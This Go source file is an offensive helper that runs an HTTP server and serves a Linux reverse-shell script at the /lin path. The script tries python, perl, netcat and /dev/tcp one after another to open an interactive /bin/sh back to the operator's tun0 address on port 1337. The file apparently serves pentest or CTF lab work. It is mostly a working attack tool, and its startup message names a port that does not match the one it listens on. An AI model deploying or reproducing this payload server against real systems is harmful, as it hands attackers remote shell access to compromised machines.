package bingo

// http server hello world
import (
	"errors"
	"fmt"
	"net"
	"net/http"
	"strings"
)

func GetInterfaceIpv4Addr(interfaceName string) (addr string, err error) {
	var (
		ief      *net.Interface
		addrs    []net.Addr
		ipv4Addr net.IP
	)
	if ief, err = net.InterfaceByName(interfaceName); err != nil { // get interface
		return
	}
	if addrs, err = ief.Addrs(); err != nil { // get addresses
		return
	}
	for _, addr := range addrs { // get ipv4 address
		if ipv4Addr = addr.(*net.IPNet).IP.To4(); ipv4Addr != nil {
			break
		}
	}
	if ipv4Addr == nil {
		return "", errors.New(fmt.Sprintf("interface %s don't have an ipv4 address\n", interfaceName))
	}
	return ipv4Addr.String(), nil
}
func revShellLinux() string {
	template := `if command -v python > /dev/null 2>&1; then
	python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("1.1.1.1",1337)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
exit;
fi

if command -v perl > /dev/null 2>&1; then
	perl -e 'use Socket;$i="1.1.1.1";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
	exit;
fi

if command -v nc > /dev/null 2>&1; then
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.1.1.1 1337 >/tmp/f
	exit;
fi

if command -v sh > /dev/null 2>&1; then
	/bin/sh -i >& /dev/tcp/1.1.1.1/1337 0>&1
	exit;
fi`
	tun0, err := GetInterfaceIpv4Addr("tun0")
	if err != nil {
		return ""
	}
	template = strings.ReplaceAll(template, "1.1.1.1", tun0)
	return template
}

func linuxHandler(w http.ResponseWriter, r *http.Request) {
	generatedShell := revShellLinux()
	fmt.Fprintf(w, "%s", generatedShell)
}

func winHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, "Hello, %s!", r.URL.Path[1:])
}

func Bingo() {
	http.HandleFunc("/lin", linuxHandler)
	http.HandleFunc("/win", winHandler)
	go func() {
		http.ListenAndServe("0.0.0.0:1338", nil)
	}()
	fmt.Println("Server started at http://0.0.0.0:61234")
}
